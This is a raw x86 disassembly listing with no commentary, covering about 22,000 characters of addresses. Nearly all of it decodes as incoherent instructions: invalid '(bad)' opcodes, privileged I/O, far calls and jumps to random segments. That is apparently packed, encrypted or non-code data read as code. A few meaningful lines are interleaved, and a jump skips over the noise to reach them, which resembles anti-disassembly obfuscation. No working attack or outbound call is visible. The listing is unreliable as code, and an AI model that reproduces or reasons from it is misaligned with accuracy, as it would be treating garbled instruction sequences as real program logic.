  40de4b:	mov    eax,ds:0x336a7a62
  40de50:	cwde   
  40de51:	leave  
  40de52:	add    BYTE PTR [esi+0x5e700744],dl
  40de58:	call   0x48324f9
  40de5d:	shr    esi,0xc3
  40de60:	pop    es
  40de61:	mov    edx,0xaeeb6938
  40de66:	xor    BYTE PTR [ecx-0x79427bf3],0x86
  40de6d:	push   ecx
  40de6e:	ja     0x40de41
  40de70:	arpl   WORD PTR [esi+0x17],sp
  40de73:	mov    DWORD PTR [ebp-0x8],edx
  40de76:	mov    edx,DWORD PTR [ebp-0x20]
  40de79:	xor    edx,eax
  40de7b:	mov    edi,0xffcd8d67
  40de80:	jmp    0x40e297
  40de85:	sahf   
  40de86:	call   0xb371:0x5de417d8
  40de8d:	adc    al,0xe5
  40de8f:	and    DWORD PTR [edx],edx
  40de91:	add    cl,BYTE PTR [ebx]
  40de93:	jno    0x40df0d
  40de95:	xor    al,0xae
  40de97:	jle    0x40df17
  40de99:	jo     0x40df14
  40de9b:	jle    0x40df1b
  40de9d:	xchg   esp,eax
  40de9e:	in     al,0x7d
  40dea0:	or     BYTE PTR [edx+ecx*8-0x74],0x4
  40dea5:	xor    ebx,DWORD PTR [edi-0x31]
  40dea8:	sub    eax,0x331062ec
  40dead:	mov    DWORD PTR [ecx+0x6337082b],esp
  40deb3:	add    DWORD PTR [esi+0x23],0xffffffe0
  40deb7:	mov    ch,0xdf
  40deb9:	pop    ebx
  40deba:	mov    ebp,ss
  40debc:	fwait
  40debd:	(bad)  
  40debe:	popf   
  40debf:	test   al,0xee
  40dec1:	fistp  DWORD PTR [esi]
  40dec3:	mov    cl,0xf0
  40dec5:	and    BYTE PTR [eax-0xc],dh
  40dec8:	call   0xc722:0xbf6ad711
  40decf:	dec    ebp
  40ded0:	test   al,0xe1
  40ded2:	std    
  40ded3:	pop    esp
  40ded4:	and    BYTE PTR [ecx],al
  40ded6:	jb     0x40dee1
  40ded8:	dec    esi
  40ded9:	inc    edi
  40deda:	sti    
  40dedb:	jbe    0x40df07
  40dedd:	jnp    0x40de96
  40dedf:	adc    al,0xda
  40dee1:	xor    DWORD PTR [ebx-0x109852c5],ecx
  40dee7:	xor    DWORD PTR [ebx+0x21],ebx
  40deea:	mov    bl,0xe8
  40deec:	scas   eax,DWORD PTR es:[edi]
  40deed:	or     esp,DWORD PTR [eax+edx*1+0x19840c6c]
  40def4:	sbb    esp,DWORD PTR [ecx-0x3217b1]
  40defa:	std    
  40defb:	cdq    
  40defc:	(bad)  
  40defe:	cmp    bh,BYTE PTR [ecx+ecx*2-0x1e]
  40df02:	or     dh,BYTE PTR [edi-0x7de3fb08]
  40df08:	ss in  eax,0x83
  40df0b:	inc    ebp
  40df0c:	mov    al,0xb5
  40df0e:	adc    al,0x8d
  40df10:	in     al,dx
  40df11:	xor    bh,0xde
  40df14:	fisubr DWORD PTR [edi-0x41]
  40df17:	std    
  40df18:	jmp    0xf5f136f8
  40df1d:	add    ebp,DWORD PTR [edx]
  40df1f:	imul   BYTE PTR [eax+0x2b604cd6]
  40df25:	fisubr WORD PTR [edx]
  40df27:	fild   DWORD PTR cs:0x61dfa1db
  40df2e:	nop
  40df2f:	daa    
  40df30:	int3   
  40df31:	(bad)  
  40df32:	sub    eax,0xa019fa4f
  40df37:	(bad)  
  40df38:	cwde   
  40df39:	aam    0xb5
  40df3b:	stos   DWORD PTR es:[edi],eax
  40df3c:	pusha  
  40df3d:	aas    
  40df3e:	cmp    esp,edi
  40df40:	leave  
  40df41:	in     eax,dx
  40df42:	pop    ss
  40df43:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40df44:	cmp    DWORD PTR [ebp+0x5b],0x53
  40df48:	cmp    edx,DWORD PTR [ebp-0xc]
  40df4b:	int3   
  40df4c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40df4d:	call   0xef38:0x5adcf66c
  40df54:	xchg   esp,eax
  40df55:	mov    dh,0x28
  40df57:	test   DWORD PTR [edx+0x14db1d72],esp
  40df5d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40df5e:	inc    bl
  40df60:	xchg   DWORD PTR ds:0x82c64eb4,edx
  40df66:	or     eax,0x830b086a
  40df6b:	xlat   BYTE PTR ds:[ebx]
  40df6c:	repz xor DWORD PTR [ebp+0x5da0e885],0x2712e493
  40df77:	into   
  40df78:	lods   eax,DWORD PTR cs:[esi]
  40df7a:	pop    esp
  40df7b:	dec    ebp
  40df7c:	aam    0x46
  40df7e:	xchg   esi,eax
  40df7f:	or     dl,bh
  40df81:	sub    bl,bh
  40df83:	jno    0x40df15
  40df85:	fsubr  QWORD PTR [ebx]
  40df87:	sbb    eax,0x86f94b40
  40df8c:	sbb    BYTE PTR [esi],al
  40df8e:	sub    al,0x12
  40df90:	sub    BYTE PTR [ebx],bl
  40df92:	mov    al,ds:0xe3542ce
  40df97:	shl    DWORD PTR [eax],0x89
  40df9a:	xor    al,0x94
  40df9c:	push   eax
  40df9d:	in     al,dx
  40df9e:	lock dec eax
  40dfa0:	rcr    DWORD PTR [ecx+0x3572fe9a],1
  40dfa6:	lods   al,BYTE PTR ds:[esi]
  40dfa7:	sub    al,0x5e
  40dfa9:	int    0x9a
  40dfab:	loope  0x40df4d
  40dfad:	inc    esp
  40dfae:	bound  ecx,QWORD PTR [esi+0x2f423256]
  40dfb4:	outs   dx,DWORD PTR ds:[esi]
  40dfb5:	mov    bl,0x1
  40dfb7:	stos   BYTE PTR es:[edi],al
  40dfb8:	inc    ecx
  40dfb9:	(bad)
  40dfbe:	shr    DWORD PTR [edx],1
  40dfc0:	gs adc eax,0x84922725
  40dfc6:	leave  
  40dfc7:	adc    ebp,DWORD PTR [ecx+0x57]
  40dfca:	mov    bh,0xe8
  40dfcc:	sub    BYTE PTR [ebp-0x67331c08],ch
  40dfd2:	(bad)  
  40dfd3:	adc    ah,dh
  40dfd5:	xchg   edx,eax
  40dfd6:	pop    esi
  40dfd7:	dec    esp
  40dfd8:	(bad)  
  40dfd9:	sbb    al,0x68
  40dfdb:	aas    
  40dfdc:	xor    dl,BYTE PTR [ebp-0x53]
  40dfdf:	in     eax,0x61
  40dfe1:	addr16 xchg ebx,eax
  40dfe3:	fimul  DWORD PTR [eax]
  40dfe5:	push   0x6c93fd3d
  40dfea:	pop    esp
  40dfeb:	lods   al,BYTE PTR ds:[esi]
  40dfec:	(bad)  [edi+0x592e24c2]
  40dff2:	(bad)  
  40dff3:	daa    
  40dff4:	daa    
  40dff5:	mov    dl,0x2b
  40dff7:	xor    DWORD PTR [ebx+0x75],0x2e4e4f34
  40dffe:	jmp    0x6c8b:0x18cc65ca
  40e005:	mov    ds:0x6c7c2767,al
  40e00a:	call   0xe0496d93
  40e00f:	xchg   esp,eax
  40e010:	inc    edi
  40e012:	dec    eax
  40e013:	mov    dl,0xb2
  40e015:	sub    BYTE PTR [eax+0xb527d4a],bh
  40e01b:	pop    esp
  40e01c:	mov    ecx,eax
  40e01e:	ret    0xf82e
  40e021:	stc    
  40e022:	(bad)  
  40e023:	xor    al,0x1e
  40e025:	fild   WORD PTR [edx-0x2d]
  40e028:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e029:	dec    eax
  40e02a:	jp     0x40e026
  40e02c:	imul   DWORD PTR [ecx+0x7fa4ccda]
  40e032:	pop    ds
  40e033:	add    eax,0x6a429603
  40e038:	cmc    
  40e039:	cmp    ah,BYTE PTR [ebx+ebp*1+0x4cc2274c]
  40e040:	stc    
  40e041:	ss adc al,0xd
  40e044:	adc    al,0x4f
  40e046:	sub    DWORD PTR [edx-0x32d0c4b8],edx
  40e04c:	mov    ebp,0x2e663e2
  40e051:	paddsw mm0,QWORD PTR [ebx+0x57b1fdd6]
  40e058:	dec    edx
  40e059:	mov    ecx,0x66490ede
  40e05e:	call   0x31ab:0xaa902495
  40e065:	(bad)  
  40e066:	es inc esi
  40e068:	mov    ds:0xd095380,eax
  40e06d:	dec    ebx
  40e06e:	inc    edx
  40e06f:	into   
  40e070:	dec    edx
  40e071:	out    0xcc,al
  40e073:	sbb    DWORD PTR [ebx+ebx*1+0x4],0xe3b4dde2
  40e07b:	pushf  
  40e07c:	call   0x95ad7636
  40e081:	imul   ebx,DWORD PTR [esi],0xfb686315
  40e087:	cld    
  40e088:	and    DWORD PTR [eax+ebx*1+0x7d],eax
  40e08c:	daa    
  40e08d:	rol    edi,1
  40e08f:	mov    ecx,0xffc5e8f3
  40e094:	fcomi  st,st(2)
  40e096:	hlt    
  40e097:	mov    ss,WORD PTR [edx-0x6]
  40e09a:	je     0x40e10e
  40e09c:	popf   
  40e09d:	and    al,0x3b
  40e09f:	sysexit 
  40e0a1:	mov    eax,ds:0xb05b2a07
  40e0a6:	push   ebp
  40e0a7:	sub    DWORD PTR [ecx+ecx*2+0x5eb85467],ecx
  40e0ae:	dec    ecx
  40e0af:	or     DWORD PTR [ebp-0x195185a],ecx
  40e0b5:	inc    ecx
  40e0b6:	int3   
  40e0b7:	repz add cl,dh
  40e0ba:	retf   
  40e0bb:	push   ds
  40e0bc:	push   cs
  40e0bd:	fwait
  40e0be:	(bad)  
  40e0bf:	lock loopne 0x40e0d3
  40e0c2:	arpl   WORD PTR [edi],di
  40e0c4:	inc    eax
  40e0c5:	out    dx,al
  40e0c6:	or     DWORD PTR [ebp+0x22],0x27
  40e0ca:	mov    cl,0xa
  40e0cc:	and    eax,0xca815b0d
  40e0d1:	sub    ebx,DWORD PTR [eax+0x59]
  40e0d4:	inc    esp
  40e0d5:	xchg   ebp,eax
  40e0d6:	add    ch,BYTE PTR [ebx]
  40e0d8:	call   0x121855df
  40e0dd:	fbstp  TBYTE PTR [esp+edi*8+0xf]
  40e0e1:	add    eax,0xf0503d58
  40e0e6:	repz adc BYTE PTR [edx-0x20c955c3],bl
  40e0ed:	or     DWORD PTR [edi+0x40],edx
  40e0f0:	test   BYTE PTR [ebx+0x31],0xd7
  40e0f4:	xchg   esi,eax
  40e0f5:	hlt    
  40e0f6:	jp     0x40e139
  40e0f8:	push   cs
  40e0f9:	mov    al,ds:0xef1f65e5
  40e0fe:	add    esi,DWORD PTR [eax+0x6cf50e56]
  40e104:	xor    esi,DWORD PTR [ecx-0x31]
  40e107:	jge    0x40e0d5
  40e109:	jle    0x40e0e0
  40e10b:	cs jbe 0x40e0e5
  40e10e:	icebp  
  40e10f:	in     al,0xfb
  40e111:	std    
  40e112:	pop    edx
  40e113:	pop    edi
  40e114:	sbb    eax,0xf1ebc778
  40e119:	sub    al,0x42
  40e11b:	es pop esi
  40e11d:	(bad)  
  40e11e:	mov    ebx,0x88e5746d
  40e123:	and    bl,bh
  40e125:	sti    
  40e126:	mov    edi,0x4124c3fb
  40e12b:	ja     0x40e139
  40e12d:	hlt    
  40e12e:	rol    BYTE PTR [ebp-0x413804d1],1
  40e134:	inc    ebx
  40e135:	sub    edi,DWORD PTR [eax+0x70]
  40e138:	jo     0x40e142
  40e13a:	inc    esp
  40e13b:	js     0x40e10e
  40e13d:	rcr    BYTE PTR [edi-0x2f8bd306],cl
  40e143:	imul   ecx,ecx,0x834a84d6
  40e149:	(bad)  
  40e14a:	in     al,0x6d
  40e14c:	enter  0xf172,0xf1
  40e150:	sub    eax,0x5ac9e364
  40e155:	jmp    0x40e179
  40e157:	sub    BYTE PTR [ebx+0x3f],cl
  40e15a:	scas   al,BYTE PTR es:[edi]
  40e15b:	aam    0xc7
  40e15d:	stos   BYTE PTR es:[edi],al
  40e15e:	and    eax,ecx
  40e160:	call   0x470322ea
  40e165:	js     0x40e1e5
  40e167:	mov    edi,0x46003f3
  40e16c:	div    DWORD PTR [edx-0x2f]
  40e16f:	inc    ecx
  40e170:	adc    BYTE PTR [ebx+0x59],bl
  40e173:	xchg   ebp,eax
  40e174:	hlt    
  40e175:	push   esp
  40e176:	mov    edx,0xf601f4f5
  40e17b:	mov    esi,0x6b7be8f4
  40e180:	or     al,0xd0
  40e182:	ror    BYTE PTR [ebx+0x164f9229],1
  40e188:	sub    BYTE PTR [edx+esi*4-0x32],bh
  40e18c:	lods   eax,DWORD PTR ds:[esi]
  40e18d:	inc    ebp
  40e18e:	or     cl,bl
  40e190:	adc    eax,DWORD PTR [esi+eax*2]
  40e193:	imul   esi,DWORD PTR [edx-0x3d6ae39],0xe2b55587
  40e19d:	mov    bh,BYTE PTR [edi-0x69fde8dd]
  40e1a3:	jp     0x40e184
  40e1a5:	aam    0x48
  40e1a7:	sub    ebp,ecx
  40e1a9:	inc    esp
  40e1aa:	mov    esp,edx
  40e1ac:	aas    
  40e1ad:	imul   esi,DWORD PTR [ebp-0x1ce047fc],0x3db575b7
  40e1b7:	call   0x72ab:0xb3524a71
  40e1be:	sbb    al,0x70
  40e1c0:	hlt    
  40e1c1:	xchg   ebx,eax
  40e1c2:	adc    dl,dh
  40e1c4:	xchg   esi,eax
  40e1c5:	test   al,0x98
  40e1c7:	push   cs
  40e1c8:	push   bx
  40e1ca:	adc    DWORD PTR [ebx+0x5b],0x47e1ce9f
  40e1d1:	sbb    DWORD PTR [eax-0x2a01b914],0xe91fcc35
  40e1db:	sar    DWORD PTR [ecx],0x98
  40e1de:	stc    
  40e1df:	adc    DWORD PTR [edi-0x58316e2],ebp
  40e1e5:	out    dx,eax
  40e1e6:	enter  0x7b15,0x43
  40e1ea:	xchg   esi,eax
  40e1eb:	add    al,0x18
  40e1ed:	push   ebp
  40e1ee:	adc    ah,BYTE PTR [ebp-0x2f]
  40e1f1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e1f2:	in     al,0x2e
  40e1f4:	sti    
  40e1f5:	adc    al,0xf9
  40e1f7:	xor    DWORD PTR [ebp+edx*1+0x4660aead],edi
  40e1fe:	jle    0x40e1ae
  40e200:	jae    0x40e1ae
  40e202:	or     al,0xca
  40e204:	pop    ds
  40e205:	add    eax,0x15e3a27
  40e20a:	mov    eax,ds:0x58f08921
  40e20f:	mov    edi,0x5c93e98d
  40e214:	sbb    al,0xdc
  40e216:	adc    DWORD PTR [ecx+eiz*2-0x3d92ef3d],esp
  40e21d:	and    eax,0x120114f3
  40e222:	repnz push edx
  40e224:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e225:	xor    eax,0x1de8dbe8
  40e22a:	in     al,dx
  40e22b:	sbb    eax,0xf22a7c30
  40e230:	jbe    0x40e208
  40e232:	or     esp,DWORD PTR [edi+0x5b]
  40e235:	add    ah,BYTE PTR [edx+0x16]
  40e238:	inc    edi
  40e239:	fnstsw WORD PTR [edi]
  40e23b:	or     DWORD PTR [ebx+ebx*4],eax
  40e23e:	inc    ebx
  40e23f:	mov    ds:0x85edf35a,eax
  40e244:	aas    
  40e245:	pop    ss
  40e246:	xchg   edx,eax
  40e247:	jo     0x40e2ae
  40e249:	call   0x37c2dcaa
  40e24e:	mov    bl,0xa1
  40e250:	(bad)  
  40e251:	aas    
  40e252:	cmp    eax,0xfdf64bc3
  40e257:	(bad)  
  40e258:	idiv   DWORD PTR [esi]
  40e25a:	int3   
  40e25b:	and    BYTE PTR [ebx+0x6abd7d0f],dh
  40e261:	cmp    ch,BYTE PTR [esi]
  40e263:	add    ebx,DWORD PTR [edi+0x4e]
  40e266:	cdq    
  40e267:	cmp    ebp,DWORD PTR [ecx]
  40e269:	sbb    BYTE PTR [edx-0x44],bl
  40e26c:	lods   eax,DWORD PTR ds:[esi]
  40e26d:	test   eax,0x9ac301e0
  40e272:	out    dx,eax
  40e273:	sbb    eax,ebx
  40e275:	(bad)  [eax+0x68ef0582]
  40e27b:	js     0x40e266
  40e27d:	arpl   WORD PTR [edx+ecx*4+0x8],cx
  40e281:	call   0x80ea:0x3b79c47c
  40e288:	cmp    ebp,DWORD PTR [esi+eax*4]
  40e28b:	jmp    0x9fc5:0x21397033
  40e292:	add    eax,0x4fd9463f
  40e297:	sub    edi,edx
  40e299:	add    edi,DWORD PTR [ebp-0x10]
  40e29c:	mov    edx,DWORD PTR [ebp-0x20]
  40e29f:	mov    ebx,DWORD PTR [ebp-0x8]
  40e2a2:	xor    edx,eax
  40e2a4:	add    edx,ecx
  40e2a6:	imul   edx,ebx
  40e2a9:	cmp    edx,edi
  40e2ab:	jbe    0x40a4fb
  40e2b1:	pop    ebx
  40e2b2:	jmp    0x40e6c9
  40e2b7:	mov    BYTE PTR [edi+0x6af53ecb],bl
  40e2bd:	xchg   ebp,eax
  40e2be:	imul   esp,ecx,0x8a5e5ddc
  40e2c4:	dec    esp
  40e2c5:	sub    BYTE PTR [ecx],bl
  40e2c7:	cs stos BYTE PTR es:[edi],al
  40e2c9:	jle    0x40e349
  40e2cb:	jo     0x40e346
  40e2cd:	jle    0x40e34d
  40e2cf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e2d0:	sub    BYTE PTR [ecx-0x1bab023f],dl
  40e2d6:	out    0xa3,al
  40e2d8:	ret    0x2e74
  40e2db:	retf   
  40e2dc:	clc    
  40e2dd:	mov    ebp,0xbf5bb8eb
  40e2e2:	add    BYTE PTR [ecx-0x2c],dl
  40e2e5:	test   eax,0xf33dc1c5
  40e2ea:	fbstp  TBYTE PTR [ebx]
  40e2ec:	jl     0x40e33b
  40e2ee:	loop   0x40e28a
  40e2f0:	enter  0x7c11,0x4b
  40e2f4:	add    eax,DWORD PTR [ebx]
  40e2f6:	cmp    eax,0x4b0e36b
  40e2fb:	mov    esi,cs
  40e2fd:	jle    0x40e2ec
  40e2ff:	cmp    DWORD PTR [edi-0x71],ebx
  40e302:	das    
  40e303:	clc    
  40e304:	dec    ebx
  40e305:	jmp    0x40e30e
  40e307:	retf   0x9e4f
  40e30a:	sbb    al,0xf5
  40e30c:	jecxz  0x40e2b6
  40e30e:	push   0xffffffc9
  40e310:	fs dec ebp
  40e312:	adc    eax,DWORD PTR [edx]
  40e314:	mov    bl,BYTE PTR [ebp-0x52]
  40e317:	fucom  st(0)
  40e319:	jne    0x40e2bb
  40e31b:	lahf   
  40e31c:	add    al,0xd1
  40e31e:	or     DWORD PTR [ebp-0x15],esp
  40e321:	std    
  40e322:	div    eax
  40e324:	fwait
  40e325:	mov    al,0x86
  40e327:	lahf   
  40e328:	cmp    ecx,edi
  40e32a:	xor    eax,0x57ffecf2
  40e32f:	adc    esp,DWORD PTR [esi+ebp*4-0x8db94ec]
  40e336:	xor    al,0xdb
  40e338:	das    
  40e339:	ds in  eax,0x7d
  40e33c:	xchg   ecx,eax
  40e33d:	iret   
  40e33e:	cli    
  40e33f:	je     0x40e39f
  40e341:	mov    cl,0xb4
  40e343:	adc    edi,DWORD PTR [esi+0x64]
  40e346:	mov    dh,0x20
  40e348:	out    dx,eax
  40e349:	bound  edx,QWORD PTR [edi+ebp*4-0x5ff04dfb]
  40e350:	pop    esp
  40e351:	fisttp WORD PTR [edi]
  40e353:	stos   BYTE PTR es:[edi],al
  40e354:	xchg   BYTE PTR [ecx-0x7a],ah
  40e357:	push   eax
  40e358:	imul   esp,DWORD PTR [ecx],0xffffffbd
  40e35b:	(bad)  
  40e35c:	lahf   
  40e35d:	cmc    
  40e35e:	aad    0xf1
  40e360:	ins    DWORD PTR es:[edi],dx
  40e361:	mov    WORD PTR [edx+0x7b],gs
  40e364:	in     eax,0xbc
  40e366:	out    dx,al
  40e367:	jp     0x40e33b
  40e369:	ins    BYTE PTR es:[edi],dx
  40e36a:	pop    eax
  40e36b:	out    0x5e,eax
  40e36d:	shl    eax,0xfd
  40e370:	fnstenv [ebx-0x22]
  40e373:	inc    ebx
  40e374:	jne    0x40e338
  40e376:	and    BYTE PTR [edi-0x1a810b37],dh
  40e37c:	cmp    al,0xb5
  40e37e:	adc    edi,DWORD PTR [esi-0x4b32f171]
  40e384:	in     al,dx
  40e385:	add    ebp,edx
  40e387:	mov    al,0xb
  40e389:	mov    ah,0x9f
  40e38b:	stos   BYTE PTR es:[edi],al
  40e38c:	push   edi
  40e38d:	jne    0x40e397
  40e38f:	pop    ebp
  40e390:	mov    cl,BYTE PTR [ebp-0x13]
  40e393:	jmp    0x1898ebad
  40e398:	inc    esp
  40e399:	xlat   BYTE PTR ds:[ebx]
  40e39a:	mov    ch,0x47
  40e39c:	and    bl,dh
  40e39e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e39f:	push   eax
  40e3a0:	(bad)  
  40e3a1:	push   edi
  40e3a2:	in     eax,0xf1
  40e3a4:	mul    DWORD PTR [ecx+0x47f77989]
  40e3aa:	mov    edi,0xff72c9d
  40e3af:	cmc    
  40e3b0:	pusha  
  40e3b1:	sub    eax,DWORD PTR [esi]
  40e3b3:	inc    eax
  40e3b4:	nop
  40e3b5:	rcr    BYTE PTR [eax-0x54],cl
  40e3b8:	popa   
  40e3b9:	dec    esi
  40e3ba:	out    dx,al
  40e3bb:	cmp    eax,0x5c8551cd
  40e3c0:	lahf   
  40e3c1:	jb     0x40e404
  40e3c3:	out    dx,al
  40e3c4:	imul   ebx,DWORD PTR [eax+0x6f7aaf93],0x2e
  40e3cb:	aam    0x62
  40e3cd:	xlat   BYTE PTR ds:[ebx]
  40e3ce:	and    BYTE PTR [edi+esi*2],bl
  40e3d1:	push   edx
  40e3d2:	shl    BYTE PTR [ecx-0xfc4bea4],0xd9
  40e3d9:	stc    
  40e3da:	add    BYTE PTR [edx],0x97
  40e3dd:	mov    ebp,0x360ed53a
  40e3e2:	pop    esi
  40e3e3:	frstor [esi]
  40e3e5:	inc    esi
  40e3e6:	jnp    0x40e376
  40e3e8:	inc    esp
  40e3e9:	mov    ds:0x3ad0447a,eax
  40e3ee:	loopne 0x40e371
  40e3f0:	mov    ch,BYTE PTR [edx-0x74]
  40e3f3:	and    ah,BYTE PTR [eax-0x6]
  40e3f6:	push   cs
  40e3f7:	jmp    0xd8e8:0x1ca36351
  40e3fe:	add    al,0xac
  40e400:	add    esi,DWORD PTR [eax-0x43]
  40e403:	pop    ecx
  40e404:	push   ss
  40e405:	scas   eax,DWORD PTR es:[edi]
  40e406:	das    
  40e407:	adc    cl,bl
  40e409:	dec    eax
  40e40a:	dec    ebx
  40e40b:	dec    ecx
  40e40c:	(bad)  [ebp+0x193f612b]
  40e412:	adc    al,0xa1
  40e414:	xchg   BYTE PTR [edi-0x71],ch
  40e417:	loope  0x40e478
  40e419:	inc    ebp
  40e41a:	inc    eax
  40e41b:	sbb    al,0x7e
  40e41d:	jecxz  0x40e424
  40e41f:	arpl   WORD PTR [eax-0x7b9c6a50],bx
  40e425:	sbb    DWORD PTR [esp+edx*4],ecx
  40e428:	pusha  
  40e429:	adc    al,0x54
  40e42b:	out    dx,al
  40e42c:	fldcw  WORD PTR [eax-0x31]
  40e42f:	sbb    dl,cl
  40e431:	int3   
  40e432:	pop    ebx
  40e433:	dec    ebp
  40e434:	popf   
  40e435:	popa   
  40e436:	mov    bh,0xce
  40e438:	push   ss
  40e439:	bound  edi,QWORD PTR [ebx+0x3d]
  40e43c:	lods   al,BYTE PTR ds:[esi]
  40e43d:	add    al,0x41
  40e43f:	test   al,0xb1
  40e441:	shr    BYTE PTR [edi-0x3085bedd],0xd4
  40e448:	adc    BYTE PTR ds:0x5e2a,ch
  40e44d:	jmp    0x40e411
  40e44f:	fld    QWORD PTR [eax]
  40e451:	adc    BYTE PTR [esi+ebp*1-0x55f8fcb],al
  40e458:	cs mov edx,0x4a93616c
  40e45e:	pop    ss
  40e45f:	mov    ?,ebx
  40e461:	out    dx,al
  40e462:	xor    al,0x74
  40e464:	loopne 0x40e443
  40e466:	push   esp
  40e467:	cmp    BYTE PTR [ebp-0x59],al
  40e46a:	retf   0x9bbf
  40e46d:	mov    eax,0xb204ddf7
  40e472:	dec    ebx
  40e473:	jne    0x40e437
  40e475:	(bad)  [edx]
  40e477:	in     eax,dx
  40e478:	loop   0x40e47f
  40e47a:	push   es
  40e47b:	out    dx,eax
  40e47c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e47d:	popf   
  40e47e:	xor    al,0xdd
  40e480:	(bad)  
  40e481:	cli    
  40e482:	sbb    DWORD PTR [ebp-0x5e029533],edx
  40e488:	add    DWORD PTR [eax-0x4b],edx
  40e48b:	and    al,0x32
  40e48d:	xor    cl,BYTE PTR [ebx+0x8]
  40e490:	and    ebp,DWORD PTR [ecx+edx*1]
  40e493:	in     al,dx
  40e494:	pushf  
  40e495:	dec    ecx
  40e496:	(bad)  
  40e497:	int    0x99
  40e499:	adc    eax,eax
  40e49b:	xchg   esi,eax
  40e49c:	fs pop esp
  40e49e:	call   0xe1fb:0x68fd3e57
  40e4a5:	jb     0x40e4cb
  40e4a7:	mov    edi,0x7fe38dd6
  40e4ac:	int3   
  40e4ad:	mov    WORD PTR [eax+eax*4+0x63f67473],cs
  40e4b4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e4b5:	ss ss jno 0x40e460
  40e4b9:	jmp    0xdcb6d872
  40e4be:	jecxz  0x40e512
  40e4c0:	add    al,0x6d
  40e4c2:	jecxz  0x40e4af
  40e4c4:	and    DWORD PTR [edi-0x641c99ca],ebp
  40e4ca:	xchg   bl,bh
  40e4cc:	jge    0x40e50c
  40e4ce:	mov    DWORD PTR [eax+0x5c],0x8c4a70ad
  40e4d5:	fldenv [edi+0x42]
  40e4d8:	inc    ebp
  40e4d9:	mov    dl,0x22
  40e4db:	sti    
  40e4dc:	in     eax,0x6
  40e4de:	dec    eax
  40e4df:	xor    eax,0x50d7ae81
  40e4e4:	stc    
  40e4e5:	xchg   edx,eax
  40e4e6:	leave  
  40e4e7:	inc    ecx
  40e4e8:	xchg   edi,eax
  40e4e9:	pop    edi
  40e4ea:	sub    eax,0x32d6f2fd
  40e4ef:	shr    DWORD PTR ds:0xace6969c,cl
  40e4f5:	enter  0x3d1b,0xc
  40e4f9:	push   0xc13f1e09
  40e4fe:	ja     0x40e4fd
  40e500:	aam    0x32
  40e502:	mov    al,ds:0x4efa21e3
  40e507:	mov    ah,0xa0
  40e509:	les    eax,FWORD PTR [edi-0x6184176b]
  40e50f:	repnz pop ebp
  40e511:	scas   al,BYTE PTR es:[edi]
  40e512:	jnp    0x40e501
  40e514:	add    BYTE PTR [ebx+0x60f5c37a],bl
  40e51a:	sub    DWORD PTR [ebx-0x6b1767b0],edx
  40e520:	aad    0xfd
  40e522:	inc    ecx
  40e523:	lock mov ecx,ebp
  40e526:	(bad)
  40e52a:	inc    ecx
  40e52b:	xor    eax,0xe5f55ca9
  40e530:	add    edx,DWORD PTR [ebp+ebx*4-0x76]
  40e534:	dec    BYTE PTR [eax]
  40e536:	pushf  
  40e537:	dec    eax
  40e538:	cs push 0x28
  40e53b:	sub    edx,ebp
  40e53d:	jge    0x40e5b4
  40e53f:	and    eax,0xa74435be
  40e544:	cmc    
  40e545:	mov    WORD PTR [esp+ecx*1+0x46],fs
  40e549:	inc    ebx
  40e54a:	fisttp DWORD PTR [edx]
  40e54c:	lock xor DWORD PTR [edi-0x569fc6],ebx
  40e553:	nop
  40e554:	addr16 adc al,0x84
  40e557:	add    eax,0x6157fc08
  40e55c:	xor    al,0xad
  40e55e:	in     eax,0x8c
  40e560:	or     BYTE PTR [ecx],ch
  40e562:	pop    ebx
  40e563:	ja     0x40e563
  40e565:	call   0x19d8:0x21eed5ec
  40e56c:	out    dx,al
  40e56d:	test   al,0x67
  40e56f:	mov    bl,0x24
  40e571:	ins    BYTE PTR es:[edi],dx
  40e572:	push   edi
  40e573:	mov    dl,0x35
  40e575:	add    BYTE PTR [esi+0x936b9ca],dh
  40e57b:	xlat   BYTE PTR ds:[ebx]
  40e57c:	push   0x5e
  40e57e:	ror    DWORD PTR [edx-0x289929b2],cl
  40e584:	les    ebp,FWORD PTR [edx-0x4e]
  40e587:	cli    
  40e588:	mov    ch,0x56
  40e58a:	xchg   esp,eax
  40e58b:	retf   0xec47
  40e58e:	leave  
  40e58f:	fcom   DWORD PTR [ebx-0x7216c118]
  40e595:	xor    eax,0xccf8452e
  40e59a:	adc    bh,bh
  40e59c:	mov    BYTE PTR [ebx+0x2b],dh
  40e59f:	adc    al,0xa2
  40e5a1:	fs ja  0x40e58b
  40e5a4:	mov    cl,0xd2
  40e5a6:	mov    WORD PTR [esi-0x14],es
  40e5a9:	jne    0x40e629
  40e5ab:	imul   edi,DWORD PTR [ebp-0x78],0x8775b1f2
  40e5b2:	lds    ebx,FWORD PTR [eax+0x16]
  40e5b5:	rol    BYTE PTR [ebp+0xa],0x10
  40e5b9:	adc    ch,BYTE PTR [ebp+0xc6c61e6]
  40e5bf:	das    
  40e5c0:	sub    BYTE PTR [edx],ch
  40e5c2:	dec    edi
  40e5c3:	in     eax,dx
  40e5c4:	add    BYTE PTR [ecx-0x60],bl
  40e5c7:	pop    ss
  40e5c8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e5c9:	xchg   esi,eax
  40e5ca:	xor    DWORD PTR [edx+ecx*2+0x4a46f621],ebp
  40e5d1:	inc    esp
  40e5d2:	xchg   BYTE PTR [ecx+0x4c],dh
  40e5d5:	dec    ebx
  40e5d6:	adc    edx,DWORD PTR [edi-0x53]
  40e5d9:	lahf   
  40e5da:	adc    DWORD PTR [edi],0x4b5c774b
  40e5e0:	jl     0x40e596
  40e5e2:	pop    ecx
  40e5e3:	mov    ds:0x706b43a9,al
  40e5e8:	in     eax,dx
  40e5e9:	jg     0x40e60a
  40e5eb:	cmp    edx,DWORD PTR [esi]
  40e5ed:	push   0x38391b7e
  40e5f2:	mov    ah,0x95
  40e5f4:	ror    BYTE PTR [eax],1
  40e5f6:	mov    eax,0x94df1d55
  40e5fb:	cli    
  40e5fc:	or     esi,DWORD PTR [esi]
  40e5fe:	in     al,dx
  40e5ff:	mov    eax,0x109a7b3d
